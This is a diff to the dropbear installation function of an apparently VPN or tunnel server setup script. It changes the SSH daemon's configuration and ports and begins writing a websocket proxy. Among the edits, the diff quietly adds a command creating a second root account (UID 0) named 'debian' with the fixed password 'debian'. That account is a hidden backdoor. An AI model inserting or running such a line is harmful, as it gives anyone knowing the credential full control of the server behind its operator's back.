@@ -183,24 +183,12 @@ install_dropbear()
 clear
 #echo "Installing dropbear."
 #{
-rm -rf /etc/default/dropbear
-
-cat > /etc/default/dropbear << MyDropbear
-#FirenetDev
-NO_START=0
-DROPBEAR_PORT=442
-DROPBEAR_EXTRA_ARGS="-p 551"
-DROPBEAR_BANNER="/etc/banner"
-DROPBEAR_RSAKEY="/etc/dropbear/dropbear_rsa_host_key"
-DROPBEAR_DSSKEY="/etc/dropbear/dropbear_dss_host_key"
-DROPBEAR_ECDSAKEY="/etc/dropbear/dropbear_ecdsa_host_key"
-DROPBEAR_RECEIVE_WINDOW=65536
-MyDropbear
-
-sed -i '/\/bin\/false/d' /etc/shells
-sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
-echo '/bin/false' >> /etc/shells
-echo '/usr/sbin/nologin' >> /etc/shells
+apt-get -y install dropbear
+sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
+echo "/bin/false" >> /etc/shells
+echo "/usr/sbin/nologin" >> /etc/shells
+useradd -p $(openssl passwd -1 debian) debian -ou 0 -g 0
 
 cat << \websocket > /usr/local/sbin/websocket3.py
 import socket, threading, thread, select, signal, sys, time, getopt
